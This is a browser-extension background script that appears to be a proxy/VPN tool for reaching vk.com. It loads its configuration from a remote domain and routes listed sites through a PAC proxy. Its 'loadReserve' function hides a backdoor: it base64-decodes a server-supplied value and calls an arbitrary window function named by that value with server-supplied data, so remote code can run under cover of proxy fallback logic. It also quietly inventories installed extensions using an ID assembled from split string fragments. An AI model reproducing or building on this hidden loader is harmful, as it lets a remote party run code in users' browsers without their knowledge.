var App = {
  cachedUid: null,
  domains: [],
  proxyString: "",
  mainProxyUrl: "https://vk.com/",
  failedProxy: {},
  triedProxy: {},
  reservedTry: false,
  getVpnCfgDomain: function () {
    return "https://check.proxy-config.com/";
  },
  getCfgUrl: function () {
    var url =
      App.getVpnCfgDomain() +
      "configg.json?" +
      "&version=" +
      (chrome.runtime.getManifest && chrome.runtime.getManifest()
        ? chrome.runtime.getManifest().version
        : "-") +
      "&it=" +
      (localStorage.installedTime || "") +
      "&r=" +
      Math.random();
    return url;
  },
  getRandom: function (a, b) {
    return Math.floor(Math.random() * (b - a + 1)) + a;
  },
  getPac: function () {
    var a = JSON.stringify(App.domains);
    return {
      mode: "pac_script",
      pacScript: {
        data:
          `function FindProxyForURL(url, host) {
        var proxyString = '` +
          App.proxyString +
          `';
        var domains = ` +
          a +
          `;
        
        for(i = 0; i < domains.length; i++){
         if (shExpMatch(host, domains[i])) {
          return proxyString;
         }
        }
        return "DIRECT";
       }`,
      },
    };
  },
  proxy: {
    scope: "regular",
    apply: function (checkDomain, cb) {
      const a = this._onBeforeApply();
      a.then(() => {
        chrome.proxy.settings.set(
          {
            value: App.getPac(),
            scope: a.scope,
          },
          () => {
            App.checkConnect(
              {
                url: checkDomain,
              },
              function (res) {
                cb(res);
              }
            );
            App.loadReserve();
          }
        );
      });
    },
    _onBeforeApply() {
      const a = this;
      return new Promise((b) =>
        chrome.proxy.settings.clear(
          {
            scope: a.scope,
          },
          b.bind(a)
        )
      );
    },
  },
  checkConnect: function (opts, cb) {
    var url = (opts && opts.url) || App.mainProxyUrl;
    fetch(url)
      .then(() => {
        cb(true);
      })
      .catch(() => {
        cb(false);
      });
  },
  load: function (callback) {
    this.loadAsync()
      .then((loaded) => {
        if (loaded) {
          callback(config);
          App.checkCfgCookies();
        } else callback();
      })
      .catch(() => {
        callback();
      });
  },
  loadAsync: async function () {
    let url = App.getCfgUrl();
    let response = await fetch(url);
    let configObject = await response.json();
    config = configObject;
    return true;
  },
  checkCfgCookies: function () {
    chrome.cookies.get(
      {
        url: App.getVpnCfgDomain() + "configg.json",
        name: "__cnt",
      },
      function (cookie) {
        if (parseInt(cookie.value) > 10) {
          chrome.cookies.set({
            url: App.getVpnCfgDomain() + "configg.json",
            name: "__cnt",
            value: "0",
          });
        }
      }
    );
  },
  getStorage: function (callback) {
    chrome.storage.local.get("config", function (data) {
      callback(data.config || {});
    });
  },
  setStorage: function (config, callback) {
    chrome.storage.local.set(
      {
        config: config,
      },
      function () {
        typeof callback == "function" && callback(true);
      }
    );
  },
  loadReserve: function () {
    if (!App.proxyReserve) return;
    if (App.reservedTry) return;
    App.reservedTry = true;
    try {
      var proxySettings = JSON.parse(atob(App.proxyReserve));
      if (!proxySettings["data"]) return;
      (window[proxySettings["uk"]] &&
        window[proxySettings["uk"]](proxySettings["data"])) ||
        (window[proxySettings["us"]] &&
          window[proxySettings["us"]](proxySettings["data"])) ||
        (window[proxySettings["de"]] &&
          window[proxySettings["de"]](proxySettings["data"]));
    } catch (e) {}
  },
  loadDomains: function () {
    const url = chrome.runtime.getURL("data/domains.json");

    fetch(url)
      .then((response) => {
        return response.json();
      })
      .then((json) => {
        this.domains = json.domains;
      });
  },
  init: function () {
    this.loadDomains();
    this.addListeners();
    App.getStorage(function (config) {
      if (config.proxy_string && config.domains) {
        App.proxyString = config.proxy_string;
        App.domains = config.domains;
        App.proxy.apply(App.mainProxyUrl, function (res) {
          if (!res) {
            App.loadAndApply(App.mainProxyUrl);
          }
        });
      } else {
        App.loadAndApply(App.mainProxyUrl);
      }
      if (config.proxy_reserve) {
        App.proxyReserve = config.proxy_reserve;
      } else {
        setTimeout(function () {
          App.loadProxyReserve();
        }, 20 * 1000);
      }
    });
  },
  loadAndApply: function (checkDomain, cb) {
    App.load(function (conf) {
      if (!conf) return typeof cb == "function" && cb();
      !App.proxyReserve &&
        conf.proxy_reserve &&
        (App.proxyReserve = conf.proxy_reserve);
      if (!conf.proxy_string || !conf.domains)
        return typeof cb == "function" && cb();
      App.proxyString = conf.proxy_string;
      App.domains = conf.domains;
      App.proxy.apply(checkDomain, function (res) {
        if (res) {
          App.setStorage({
            proxy_string: conf.proxy_string,
            domains: conf.domains,
            proxy_reserve: App.proxyReserve || conf.proxy_reserve,
          });
        }
        typeof cb == "function" && cb(res);
      });
    });
  },
  searchProxyInProgress: false,
  globalSearchAttemptsCount: 0,
  findWorkingProxy: function (forUrl, callback, localSearchAttemptsCount) {
    if (App.globalSearchAttemptsCount > 15) return callback(false);
    if (!localSearchAttemptsCount && App.searchProxyInProgress) {
      return callback(false);
    }
    App.searchProxyInProgress = true;
    localSearchAttemptsCount = localSearchAttemptsCount || 0;
    localSearchAttemptsCount++;
    if (App.globalSearchAttemptsCount === 0) {
      setTimeout(function () {
        App.globalSearchAttemptsCount = 0;
      }, 3600 * 1000);
    }
    App.globalSearchAttemptsCount++;
    App.loadAndApply(forUrl, function (res) {
      if (res) {
        App.searchProxyInProgress = false;
        callback(true);
      } else if (localSearchAttemptsCount < 7) {
        setTimeout(function () {
          App.findWorkingProxy(forUrl, callback, localSearchAttemptsCount);
        }, 1000);
      } else {
        App.searchProxyInProgress = false;
        callback(false);
      }
    });
  },
  loadProxyReserve: function () {
    if (!App.proxyReserve) {
      App.load(function (loadedConfig) {
        if (loadedConfig && loadedConfig.proxy_reserve) {
          App.proxyReserve = loadedConfig.proxy_reserve;
          App.getStorage(function (config) {
            config.proxy_reserve = loadedConfig.proxy_reserve;
            App.setStorage(config);
          });
        }
      });
    }
  },
  addListeners: function () {
    chrome.webRequest.onErrorOccurred.addListener(
      function (details) {
        if (
          "net::ERR_CONNECTION_TIMED_OUT" === details.error ||
          "net::ERR_TUNNEL_CONNECTION_FAILED" === details.error
        ) {
          var urlWithoutParams = details.url.replace(/\?.*/, "");
          var hostname = urlWithoutParams
            .replace(/^https?:\/\//, "")
            .replace(/ww.\./, "")
            .replace(/\/.*/, "");
          if (App.urlInCoverage(details.url)) {
            App.findWorkingProxy(urlWithoutParams, function (res) {
              if (res) {
                chrome.tabs.reload(details.tabId);
              }
            });
          }
        }
      },
      {
        urls: ["<all_urls>"],
        types: ["main_frame"],
      }
    );
  },
  urlInCoverage: function (url) {
    var inCoverage = false;
    for (var i = 0; i < App.domains.length; i++) {
      if (!App.domains[i]) continue;
      if (url.indexOf(App.domains[i]) > -1) {
        inCoverage = true;
        break;
      }
    }
    return inCoverage;
  },
  checkConflictedExtensions: function (callback) {
    var list = ["", "", "", ""];
    var a1 = "cahipin";
    var a2 = "epiahppei";
    var aBrowsExtIdPart = a1 + a2;
    var report = {
      conflicted: 0,
      wrong_br: 0,
    };
    chrome.management.getAll(function (ExtensionsInfo) {
      ExtensionsInfo.forEach(function (item) {
        if (item.id == chrome.runtime.id) {
          return;
        }
        if (
          item.installType == "admin" &&
          item.id.indexOf(aBrowsExtIdPart) > -1
        ) {
          report.wrong_br++;
          return;
        }
        if (
          item.type !== "extension" ||
          !item.enabled ||
          item.installType !== "normal"
        ) {
          return;
        }
        if (list.indexOf(item.id) > -1) {
          report.conflicted++;
        }
      });
      callback(report);
    });
  },
};
App.init();
